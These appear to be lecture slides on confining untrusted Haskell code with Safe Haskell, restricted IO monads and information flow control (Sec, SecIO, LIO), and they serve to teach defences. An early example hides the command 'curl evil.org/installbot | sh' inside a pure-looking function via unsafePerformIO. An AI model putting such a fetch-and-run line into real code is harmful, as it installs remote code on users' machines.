
# Untrusted code

* Say you want to incorporate untrusted code in a Haskell application
* Example:  Some third-party translation software
    * You built a web server
    * Want to add a "translate to Pig Latin" button to each web page
    * Download some random code with this function

        ~~~~ {.haskell}
        toPigLatin :: L.ByteString -> L.ByteString
        ~~~~

* If you could trust the type (no `IO`), this would be safe to run
    * Worst case, users get garbled text on web page
* However, what if you have?

    ~~~~ {.haskell}
    toPigLatin = unsafePerformIO $ do
      system "curl evil.org/installbot | sh"
      return "Ia owna ouya"
    ~~~~

# [Safe Haskell][SafeHaskell]

* Starting with GHC 7.2, `-XSafe` option enables
  [Safe Haskell][SafeHaskell]
    * Courtesy of our very own CA, David Terei
* Safe Haskell disallows import of any unsafe modules
    * E.g., can't import `System.IO.Unsafe`, so can't call `unsafePerformIO`
* Safe imports (enabled by `-XUnsafe`) require an import to be safe

    ~~~~ {.haskell}
    import safe PigLatin (toPigLatin)
    ~~~~

    * The above should guarantee that `toPigLatin` doesn't call unsafe
      functions
* But wait... doesn't `toPigLatin` use ByteString?

    ~~~~ {.haskell}
    head :: {- Lazy -} ByteString -> Word8
    head Empty       = errorEmptyList "head"
    head (Chunk c _) = S.unsafeHead c

    unsafeHead :: {- Strict -} ByteString -> Word8
    unsafeHead (PS x s l) = assert (l > 0) $
        inlinePerformIO $ withForeignPtr x $ \p -> peekByteOff p s
    ~~~~

# Safe vs. Trustworthy

* A module compiled `-XSafe` can only import safe modules
    * As if all imports implicitly have `safe` keyword
* But there are *two* kinds of safe module
    1. Modules verified to be safe by the compiler, compiled `-XSafe`
    2. Modules asserted to be safe by the author, compiled
    `-XTrustworthy`
* So a module like `Data.ByteString` can be compiled `-XTrustworthy`
    * Put unsafe functions in separate `Data.ByteString.Unsafe` module
    * Assert `Data.ByteString`'s exported symbols cannot be used
      unsafely, even if the module internally makes use of unsafe
      functions
* Of course, might or might not trust module author
    * Can specify on a per-package basis whether to honor `-XTrustworthy`
    * Flag `-fpackage-trust` enables such per-package trust
    * Use flags, `-trust` *Pkg*, `-distrust` *Pkg*, `-distrust-all-packages`
    * Can also set default for a package with `ghc-pkg`

# What if untrusted code needs to do IO?

* Suppose you want to translate to a real language
    * Generally requires massive data sets
    * Untrusted code would at minimum need to do file IO
    * Or maybe easiest to send text over network to, e.g., Google translate
* Idea: use a *restricted* IO monad, `RIO`
    * Untrusted third party implements `googleTranslate` function

        ~~~~ {.haskell}
        googleTranslate :: Language -> L.ByteString -> RIO L.ByteString
        ~~~~

    * But uses the `RIO` monad, instead of `IO`
    * Implement `RIO` functions to access network, file system
    * Have functions reject *dangerous* operations
    * Can use same names and port `IO` code to `RIO` by manipulating imports

# Example: hypothetical `RIO` monad

~~~~ {.haskell}
{-# LANGUAGE Trustworthy #-}
module RIO (RIO(), runRIO, RIO.readFile) where

-- Notice that symbol UnsafeRIO is not exported from this module!
newtype RIO a = UnsafeRIO (IO a)
runRIO :: RIO a -> IO a
runRIO (UnsafeRIO io) = io

instance Monad RIO where ...

-- Returns True iff access is allowed to file name
pathOK :: FilePath -> IO Bool
pathOK file = -- policy, e.g., only allow files in /tmp

readFile :: FilePath -> RIO String
readFile file = UnsafeRIO $ do
  ok <- pathOK file
  if ok then Prelude.readFile file else return ""
~~~~

* Note use of `newtype` -- `RIO` is same as `IO` at runtime
    * Anyone can turn an `RIO` action into an `IO` one with `runRIO`
    * But can't create `RIO` action from `IO` without `UnsafeRIO`

# Exercise: implement RIO Monad instance

~~~~ {.haskell}
newtype RIO a = UnsafeRIO (IO a)
runRIO :: RIO a -> IO a
runRIO (UnsafeRIO io) = io
~~~~

* Starter code:
  `wget`
  [`cs240h.stanford.edu/RIO.hs`](http://cs240h.scs.stanford.edu/RIO.hs)

~~~~
GHCi, version 7.8.2: http://www.haskell.org/ghc/  :? for help
...
*RIO> writeFile "/tmp/hello" "Hello, world\n"
*RIO> runRIO $ RIO.readFile "/tmp/hello"
"Hello, world\n"
*RIO> runRIO $ RIO.readFile "/etc/passwd"
""
*RIO> 
~~~~

* Bonus:  what's wrong with the following, alternate definition of
  `runRIO`?

~~~~ {.haskell}
newtype RIO a = UnsafeRIO { runRIO :: IO a }
~~~~

# Solutions

~~~~ {.haskell}
newtype RIO a = UnsafeRIO (IO a)
~~~~

* Monad solution:

~~~~ {.haskell}
instance Monad RIO where
  return = UnsafeRIO . return
  m >>= k = UnsafeRIO $ runRIO m >>= runRIO . k
  fail = UnsafeRIO . fail
~~~~

* Bonus solution:
    * The problem is selectors can be used to _update_ state
    * Exporting `runRIO` is tantamount to exporting `UnsafeRIO`

    ~~~~ {.haskell}
    badRIO :: IO a -> RIO a
    badRIO io = (fail "ha ha") { runRIO = io }
    ~~~~

    * Can execute arbitrary `IO` actions from within `RIO`:

    ~~~~
    *Main> runRIO $ badRIO $ putStrLn "gotcha"
    gotcha
    ~~~~

# Example policies for RIO

* Only read and write files under some sandbox subdirectory
    * Protect most of file system from untrusted code
* Do not allow execution of other programs
    * Would escape from `RIO` restrictions
* Only allow connections to port 80, and only to known servers
    * Don't want untrusted code sending spam, attacking mysql, etc.
* Do not allow access to devices
    * Microphone, camera, speaker, etc.
* Similar to policies that apply to Java/JavaScript in browser

# Why RIO isn't enough

* What if the web site contains private data, such as email?
* An attack by malicious `googleTranslate` function:
    * Save a copy of private email under `/sandbox` (allowed)
    * When asked to translate a special string, return stored email
    * Attacker sends himself an email with special string to read stored email
* Another attack
    * Send query to attacker's own website instead of Google
* Problem: really need to keep track of what information is sensitive
    * Okay to send public data over network
    * Not okay to send email (or maybe only okay to send to specific Google URL)
    * Okay to write files, but have to keep track of which files
      contain whose email
* Solution: Decentralized Information Flow Control (DIFC)

# What is DIFC?

![](lintro.svg)

* IFC originated with military applications and classified data
* Every piece of data in the system has a label
* Every process/thread has a label
* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)

# What is DIFC?

![](lread.svg)

* IFC originated with military applications and classified data
* Every piece of data in the system has a label
* Every process/thread has a label
* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)
    * File read?  Information flows from file to emacs.  System
      requires $L_F\sqsubseteq L_E$.

# What is DIFC?

![](lwrite.svg)

* IFC originated with military applications and classified data
* Every piece of data in the system has a label
* Every process/thread has a label
* Labels are partially ordered by $\sqsubseteq$ ("can flow to")
* Example:  Emacs (labeled $L_E$) accesses file (labeled $L_F$)
    * File read?  Information flows from file to emacs.  System
      requires $L_F\sqsubseteq L_E$.
    * File write?  Information flows in both directions.  System
      enforces that $L_F\sqsubseteq L_E$ and $L_E\sqsubseteq L_F$.

# Labels are transitive

![](trans1.svg)

* $\sqsubseteq$ is a transitive relation - makes it easier to reason
  about security
* Example: Label file so it cannot flow to Internet
    * Policy holds regardless of what other software does

# Labels are transitive

![](trans2.svg)

* $\sqsubseteq$ is a transitive relation - makes it easier to reason
  about security
* Example: Label file so it cannot flow to Internet
    * Policy holds regardless of what other software does
* Suppose a buggy app reads file (e.g., desktop search)

# Labels are transitive

![](trans3.svg)

* $\sqsubseteq$ is a transitive relation - makes it easier to reason
  about security
* Example: Label file so it cannot flow to Internet
    * Policy holds regardless of what other software does
* Suppose a buggy app reads file (e.g., desktop search)
    * Process labeled $L_\mathrm{bug}$ reads file, so must have
      $L_F\sqsubseteq L_\mathrm{bug}$
    * But $L_F\sqsubseteq L_\mathrm{bug}\wedge
      L_\mathrm{bug}\sqsubseteq L_\mathrm{net}\Longrightarrow
      L_F\sqsubseteq L_\mathrm{net}$, thus
      $L_\mathrm{bug}\> !\sqsubseteq L_\mathrm{net}$

# Labels are transitive

![](trans4.svg)

* $\sqsubseteq$ is a transitive relation - makes it easier to reason
  about security
* Example: Label file so it cannot flow to Internet
    * Policy holds regardless of what other software does
* Conversely, any app that can write to network cannot read file

# Labels form a lattice

![](ablattice.svg)

* Consider two users, $A$ and $B$
    * Label public data $L_\emptyset$, $A$'s private data $L_A$, $B$'s
      private data $L_B$
* What happens if you mix $A$'s and $B$'s private data in a single document?
    * Both $A$ and $B$ should be concerned about the release of such a document
    * Need a label at least as restrictive as both $L_A$ and $L_B$
    * Use the least upper bound (a.k.a. *join*) of $L_A$ and $L_B$,
      written $L_A\sqcup L_B$

# **D**IFC is **D**ecentralized

![](decentralized.svg)

* Every process has a set of privileges
* Exercising privilege $p$ changes label requirements
    * $L_F\sqsubseteq_p\> L_\mathrm{proc}$ to read, and additionally
      $L_\mathrm{proc}\sqsubseteq_p\> L_F$ to write file
    * $\sqsubseteq_p$ (``can flow under privileges $p$'') is more
      permissive than $\sqsubseteq$
* Idea: Set labels so you know who has relevant privs.

# Example privileges

![](ablattice.svg)

* Consider again simple two user lattice
* Let $a$ be user $A$'s privileges, $b$ be user $B$'s privileges
* Clearly $L_A\sqsubseteq_a\>L_\emptyset$ and $L_B\sqsubseteq_b\>L_\emptyset$
    * Users should be able to make public or *declassify* their own private data
* Users should also be able to *partially declassify* data
    * I.e., $L_{AB}\sqsubseteq_a\>L_B$ and $L_{AB}\sqsubseteq_b\>L_A$

# Example privileges

![](aequiv.svg)

* Exercising privileges $a$ effectively means:
    * $L_A$ becomes equivalent to $L_\emptyset$
    * $L_AB$ becomes equivalent to $L_B$
  

# The `Sec` monad [[Russo]](http://www.cse.chalmers.se/~russo/seclib.htm), [[Russo]](http://www.cse.chalmers.se/~russo/eci11/lectures/index.shtml)

* Let's encode a really simple two-point lattice in Haskell's type system
    * Let type `H` represent secret ("high") data, and `L` public ("low") data

    ~~~~ {.haskell}
    {-# LANGUAGE Unsafe #-}
    Module Sec where
    data L = Lpriv
    data H = Hpriv
    ~~~~

    * Type represents secrecy level, constructor represents privileges

    ~~~~ {.haskell}
    {-# LANGUAGE Trustworthy #-}
    Module Sec.Safe (module Sec) where
    import Sec (L, H, Sec, sec, open, up)
    ~~~~

    * Let's also (in module `Sec`) represent the lattice
      ($L\sqsubseteq H$) in the type system

    ~~~~ {.haskell}
    class Flows sl sh where
    instance Flows L L
    instance Flows L H
    instance Flows H H
    -- Notice no instance for Flows H L
    ~~~~

# The `Sec` monad (continued)

* Let's protect secret values with monads by adding to module `Sec`
    * Define two monads, `Sec H` for high data, and `Sec L` for low data

    ~~~~ {.haskell}
    newtype Sec s a = MkSec a

    instance Monad (Sec s) where
      return x = MkSec x
      MkSec a >>= k = k a
    ~~~~

    * Allow anyone to label a value, but require privileges to unlabel

    ~~~~ {.haskell}
    label :: a -> Sec s a
    label x = MkSec x
    unlabel :: Sec s a -> s -> a
    unlabel (MkSec a) s = s `seq` a     -- s (H or L) acts like key
    ~~~~

    * Notice `seq` call, ensures "`unlabel undefined secval`" will crash
    * Allow data to be re-labeled according to $\sqsubseteq$ relation

    ~~~~ {.haskell}
    relabel :: (Flows lin lout) => Sec lin a -> Sec lout a
    relabel (MkSec val) = MkSec val
    ~~~~

# Applying the `Sec` monad

* Untrusted code gets access to sensitive data only in `Sec` monads
* Possible policy:
    * Data labeled `Sec L` can be sent over network
    * Data labeled `Sec H` can only be sent to Google
    * Implement by providing specific trusted functions

    ~~~~ {.haskell}
    queryGoogle :: Sec H L.ByteString -> IO (Sec H L.ByteString)
    queryGoogle labeledQuery = do
      let query = unlabel Hpriv labeledQuery  -- code is privileged,
      ...                                     -- so have Hpriv
    ~~~~

* This isn't a very satisfying solution
    * Decision to query google can't depend on data
    * So we aren't really getting the full benefit of monads (more
      like `Applicative`)

# `IO` and `Sec`

* What if instead we combined `Sec` and `IO`?

    ~~~~ {.haskell}
    untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)
    ~~~~

   * Safe to run this computation?

# `IO` and `Sec`

* What if instead we combined `Sec` and `IO`?

    ~~~~ {.haskell}
    untrustedTranslate :: Sec H L.ByteString -> Sec H (IO L.ByteString)
    ~~~~

   * Safe to run this computation?  **No!**

    ~~~~ {.haskell}
    untrustedTranslate secbs = do
      bs <- secbs
      return $ do writeFile "PublicFile" bs -- oops, pwned
                  {- query Google for translation -}
    ~~~~

   * Let's combine ideas of `RIO` and `Sec` in a `SecIO` monad

    ~~~~ {.haskell}
    newtype SecIO s a = MkSecIO (IO (Sec s a)) -- MkSecIO analogous to UnsafeRIO
    instance Monad (SecIO s) where
        return x = MkSecIO (return (return x))
        MkSecIO m >>= k = MkSecIO $ do
          MkSec a <- m
          let MkSecIO m' = k a
          m'
    run :: SecIO s a -> IO (Sec s a)
    run (MkSecIO m) = m
    ~~~~

# The `SecIO` monad

* Allow `Sec` value to be accessed within `SecIO` monad:

    ~~~~ {.haskell}
    value :: Sec s a -> SecIO s a
    value sa = MkSecIO (return sa)
    ~~~~

* Can return high values from `SecIO L` by wrapping in `Sec`:

    ~~~~ {.haskell}
    plug :: Flows sl sh => SecIO sh a -> SecIO sl (Sec sh a)
    ~~~~

    * Let's you execute `SecIO H` computations within `SecIO L` monad,
      the "price" is that the result is locked up in the `Sec H` monad


* How to represent files (similar for `IORef`s, etc.)?

    ~~~~ {.haskell}
    -- Must encode level of file in type, path of file in value
    type File s = SecFilePath String

    readFileSecIO :: File s -> SecIO s' (Sec s String)
    writeFileSecIO :: File s -> String -> SecIO s ()

    -- E.g., Can write to high files and returns high Int:
    c1 :: SecIO H Int
    -- Can write to low or (using plug) high files, returns low Int:
    c3 :: SecIO L Int
    -- Can write to low or high files, returns high Int:
    c2 :: SecIO L (Sec H Int)
    ~~~~

<!--
* Idea extends to other types of resources (e.g., `IORef`s)

    ~~~~ {.haskell}
    type DataInvariant a = (a -> IO Bool)
    data Loc t s a b = MkLoc t (DataInvariant a) (DataInvariant a)
    type File s = Loc FilePath s String ()
    ~~~~
-->

# `SecIO` translator

* Still need privileged function

    ~~~~ {.haskell}
    queryGoogle :: Sec H L.ByteString -> SecIO H L.ByteString
    ~~~~

    * Represents the fact that Google is trusted with high data
    * Makes sense you need to implement this to encode policy

* Now implement untrusted code as follows

    ~~~~ {.haskell}
    untrustedTranslate :: Sec H L.ByteString -> SecIO H L.ByteString
    ~~~~

    * Function can invoke `queryGoogle`, but not send data to other places

* `SecIO` does most enforcement at compile time
* Problem: for email, really want separate labels for every *user*
    * Users added dynamically, so hard to encode this with `Flows`...


# LIO monad [[Stefan]]

* `cabal install` [`lio`](http://hackage.haskell.org/package/lio)
  (or `stack install lio`)

* Idea:  Let's keep track of labels _dynamically_, at run time
    * Track both _current label_ and maximum label or _clearance_
    * Associate an `LIOState` with each thread:

    ~~~~ {.haskell}
    -- Note type parameter l just specifies the label type
    data LIOState l = LIOState { lioLabel, lioClearance :: !l }
    ~~~~

* Now make `RIO`-like monad that disallows raw `IO`

    ~~~~ {.haskell}
    {-# LANGUAGE Unsafe #-}

    newtype LIO l a = LIOTCB (IORef (LIOState l) -> IO a)

    instance Monad (LIO l) where
      return = LIOTCB . const . return
      (LIOTCB ma) >>= k = LIOTCB $ \s -> do
        a <- ma s
        case k a of LIOTCB mb -> mb s
    ~~~~

    * So initially, we can't do _any_ IO within `LIO` monad

# Backdoors for privileged code

* Idea: Trustworthy code wraps IO actions with label checks

* Need some back doors into IO just for Trustworthy code:

    ~~~~ {.haskell}
    {-# LANGUAGE Unsafe #-}

    ioTCB :: IO a -> LIO l a -- back door for privileged code
    ioTCB = LIOTCB . const   -- to execute arbitrary IO actions
    ~~~~

* Also handy to have access to state:

    ~~~~ {.haskell}
    getLIOStateTCB :: LIO l (LIOState l)
    getLIOStateTCB = LIOTCB readIORef

    putLIOStateTCB :: LIOState l -> LIO l ()
    putLIOStateTCB s = LIOTCB $ \sp -> writeIORef sp $! s

    modifyLIOStateTCB :: (LIOState l -> LIOState l) -> LIO l ()
    modifyLIOStateTCB = getLIOStateTCB >>= putLIOStateTCB . f
    ~~~~

* Note important convention: symbols ending ...`TCB` never available
  to safe modules

# Implementing labels in Haskell

* Implementing labels as values is straight-forward:

    ~~~~ {.haskell}
    Module LIO.Label

    class (Eq l, Show l, Read l, Typeable l) => Label l where
      lub :: l -> l -> l
      glb :: l -> l -> l
      infixl 5 `lub` `glb`
      canFlowTo :: l -> l -> Bool
      infix 4 `canFlowTo`
    ~~~~

* What about privileges?

    * Want to know when one privilege subsumes another

    ~~~~ {.haskell}
    class (Typeable p, Show p) => SpeaksFor p where
      speaksFor :: p -> p -> Bool
    ~~~~

    * And how privileges affect the `` `canFlowTo` `` relation

    ~~~~ {.haskell}
    class (Label l, SpeaksFor p) => PrivDesc l p where
      downgradeP :: p -> l -> l  -- compute "lowest" equivalent label
      canFlowToP :: p -> l -> l -> Bool
      canFlowToP p l1 l2 = downgradeP p l1 `canFlowTo` l2
    ~~~~

# Exercise: Implement a `Label` instance

~~~~ {.haskell}
data Level = Public | Secret | TopSecret
data Compartment = Nuclear | Crypto
data MilLabel = MilLabel { level :: Level
                         , compartments :: Set Compartment
                         }
~~~~
![](millattice.svg)


* `wget` [`cs240h.stanford.edu/millattice.hs`](http://cs240h.scs.stanford.edu/millattice.hs)
* Bonus: write some quickcheck properties

# Solution

* Label instance

    ~~~~ {.haskell}
    instance Label MilLabel where
      lub a b = MilLabel (max (level a) (level b))
                  (Set.union (compartments a) (compartments b))
      glb a b = MilLabel (min (level a) (level b))
                  (Set.intersection (compartments a) (compartments b))
      canFlowTo a b = level a <= level b
                      && compartments a `Set.isSubsetOf` compartments b
    ~~~~

* Some quickcheck instances

    ~~~~ {.haskell}
    prop_irreflexive :: MilLabel -> MilLabel -> Bool
    prop_irreflexive l1 l2 =
      if l1 == l2 then l1 `canFlowTo` l2 && l2 `canFlowTo` l1
      else not (l1 `canFlowTo` l2 && l2 `canFlowTo` l1)

    prop_lub :: MilLabel -> MilLabel -> Bool
    prop_lub l1 l2 = l1 `canFlowTo` l3 && l2 `canFlowTo` l3
      where l3 = l1 `lub` l2
    ~~~~

# Adjusting and checking labels

* Before reading any data labeled `newl`, adjust/check `LIOState`

    ~~~~ {.haskell}
    taint :: Label l => l -> LIO l ()
    taint newl = do
      LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
      let l' = l `lub` newl
      unless (l' `canFlowTo` c) $ labelError "taint" [newl]
      modifyLIOStateTCB $ \s -> s { lioLabel = l' }
    ~~~~

* Before writing any data labeled `newl`, adjust/check `LIOState`

    ~~~~ {.haskell}
    guardWrite :: Label l => l -> LIO l ()
    guardWrite newl = do
      LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
      unless (canFlowTo l newl && canFlowTo newl c) $
        labelError "guardWrite" [newl]
      withContext "guardWrite" $ taint newl
    ~~~~

# Privileges vs. privilege descriptions

* Want to be able to name/examine privileges in any context

* _Embody_ the privileges by wrapping them with in protected `newtype`

    ~~~~ {.haskell}
    newtype Priv a = PrivTCB a deriving (Show, Eq, Typeable)

    instance Monoid p => Monoid (Priv p) where
      mempty = PrivTCB mempty
      mappend (PrivTCB m1) (PrivTCB m2) = PrivTCB $ m1 `mappend` m2

    privDesc :: Priv a -> a
    privDesc (PrivTCB a) = a
    ~~~~

    * Given a `Priv`, can get a description with `privDesc`, but not
      vice versa

* How to create privileges in the first place?

    * Generate them in `IO` at start of program, before invoking `LIO`

    ~~~~ {.haskell}
    privInit :: p -> IO (Priv p)
    privInit p = return $ PrivTCB p
    ~~~~

    * Remember, if bad guy can execute arbitrary `IO` code, game over
      anyway


# Using `Priv` Objects

* Many LIO functions have ...`P` variants taking privilege
    * E.g., replace calls to `taint` with ones to `taintP`:

    ~~~~ {.haskell}
    taintP :: PrivDesc l p => Priv p -> l -> LIO l ()
    taintP p newl = do
      LIOState { lioLabel = l, lioClearance = c } <- getLIOStateTCB
      let l' = l `lub` downgradeP p newl
      unless (l' `canFlowTo` c) $ labelErrorP "taintP" p [newl]
      modifyLIOStateTCB $ \s -> s { lioLabel = l' }
    ~~~~

* Can also delegate privileges, wrap them in closures, or check them
  by "gating" closures

    ~~~~ {.haskell}
    delegate :: SpeaksFor p => Priv p -> p -> Priv p

    newtype Gate p a = GateTCB (p -> a) deriving Typeable

    gate :: (p -> a) -> Gate p a
    gate = GateTCB

    callGate :: Gate p a -> Priv p -> a
    callGate (GateTCB g) = g . privDesc
    ~~~~

# Wrapping IO abstractions

* Many LIO abstractions just LIO ones plus a label

    ~~~~ {.haskell}
    data LObj label object = LObjTCB !label !object deriving (Typeable)
    ~~~~

* `blessTCB` helper makes constructing LIO functions easy
    * through the magic of functional dependencies

    ~~~~ {.haskell}
    {-# LANGUAGE Trustworthy #-}

    import LIO.TCB.LObj

    type LMVar l a = LObj l (MVar a)

    takeLMVar :: Label l => LMVar l a -> LIO l a
    takeLMVar = blessTCB "takeLMVar" takeMVar

    tryTakeLMVar :: Label l => LMVar l a -> LIO l (Maybe a)
    tryTakeLMVar = blessTCB "tryTakeLMVar" tryTakeMVar

    putLMVar :: Label l => LMVar l a -> a -> LIO l ()
    putLMVar = blessTCB "putLMVar" putMVar
    ~~~~


# Need pure values as well as side-effects

* Represent labeled pure values with type wrapper

    ~~~~ {.haskell}
    data Labeled l t = LabeledTCB l t
    ~~~~

    * Pure values are suitable for mashalling, insertion in database

* The `LIO l` monad (for `Label l`) is like a state monad w. *current* label
    * Current label rises to LUB of all data observed
* Can label and unlabel pure values in `LIO` monad:

    ~~~~ {.haskell}
    label :: Label l => l -> a -> LIO l (Labeled l a)
    unlabel :: (Label l) => Labeled l a -> LIO l a
    unlabelP :: Priv l p => p -> Labeled l a -> LIO l a
    ~~~~

    * `label` requires value label to be above current label
    * `unlabel` raises current label to LUB with removed `Labeled`
      (`unlabelP` uses privileges to raise label less)

* Launch computation, defer raising label until you need result

    ~~~~ {.haskell}
    lFork :: Label l => l -> LIO l a -> LIO l (LabeledResult l a)	
    lWait :: Label l => LabeledResult l a -> LIO l a
    ~~~~

# Other `LIO` features

* Clearance
    * Special label maintained w. current label in `LIO` state
    * Represents upper bound on current label
    * Can lower clearance to label, but raising requires privileges
    * Allows "need-to-know" policies, reducing danger of covert channels
* Labeled exceptions
    * Can only catch exceptions thrown at points below your clearance
    * Get tainted by exception when you catch it
* Example application is [Hails](http://hails.scs.stanford.edu/) web
  framework
    * Really a framework for creating web _platforms_ hosting mutually
      distrustful apps


[SafeHaskell]: http://www.haskell.org/ghc/docs/latest/html/users_guide/safe-haskell.html

[[Stefan]]: http://www.cse.chalmers.se/~russo/publications_files/haskell11.pdf
